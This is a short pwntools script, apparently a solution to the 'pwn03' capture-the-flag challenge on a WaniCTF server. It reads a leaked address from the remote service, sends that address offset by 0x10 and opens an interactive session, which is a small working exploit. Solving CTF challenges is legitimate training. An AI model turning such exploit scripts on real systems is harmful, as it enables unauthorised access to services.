from pwn import *

#p = process(["./pwn03"])
p = remote("binsh.wanictf.org", 9003)
res = p.recvline().split(" ")[-1].replace(".\n", "")
print(res)
p.sendline(hex(int(res, 16)+0x10))

p.interactive()
